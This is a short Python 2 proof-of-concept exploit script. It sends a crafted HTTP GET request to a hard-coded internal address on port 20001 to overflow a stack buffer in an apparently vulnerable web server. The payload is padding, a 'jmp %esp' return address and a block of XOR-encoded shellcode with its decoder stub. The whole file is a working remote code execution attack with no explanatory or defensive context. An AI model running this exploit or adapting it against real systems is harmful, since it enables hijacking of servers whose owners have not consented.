
from struct import pack
from socket import *

def poc(host, port):

	s = socket()

	s.settimeout(10)
	s.connect((host, port))
	

	head = "GET "
	stub = " HTTP/1.1"

	payload = ""
	payload += "A" * 0x8B

	# 0x08049f4f jmp %esp

	payload += pack("<I", 0x08049f4f)

	payload += "\xeb\x12\x5b\x31\xc9\xb1\x75\x8a\x03\x34"
	payload += "\x1e\x88\x03\x43\x66\x49\x75\xf5\xeb\x05"
	payload += "\xe8\xe9\xff\xff\xff\x74\x78\x46\x74\x1f"
	payload += "\x45\x2f\xd7\x4f\x74\x1f\x74\x1c\x97\xff"
	payload += "\xd3\x9e\x97\xd8\x2f\xcc\x4c\x78\x76\x0f"
	payload += "\x42\x78\x76\x1c\x1e\x97\xff\x74\x0e\x4f"
	payload += "\x4e\x97\xff\xad\x1c\x74\x78\x46\xd3\x9e"
	payload += "\xae\x78\xad\x1a\xd3\x9e\x4c\x48\x97\xff"
	payload += "\x5d\x74\x78\x46\xd3\x9e\x97\xdd\x74\x1c"
	payload += "\x47\x74\x21\x46\xd3\x9e\xfc\xe7\x74\x21"
	payload += "\x46\xd3\x9e\x2f\xcc\x4c\x76\x70\x31\x6d"
	payload += "\x76\x76\x31\x31\x7c\x77\x97\xfd\x4c\x78"
	payload += "\x76\x33\x77\x97\xff\x4c\x4f\x4d\x97\xff"
	payload += "\x74\x15\x46\xd3\x9e\x74\x1f\x46\x2f\xc5"
	payload += "\xd3\x9e";

	payload += "D" * (1024 - len(head + stub + payload))

	packet = head + payload + stub

	print "packet len : %d " % len(packet)

	s.send(packet)

if __name__ == '__main__':
	poc("10.0.0.18", 0x4e21)
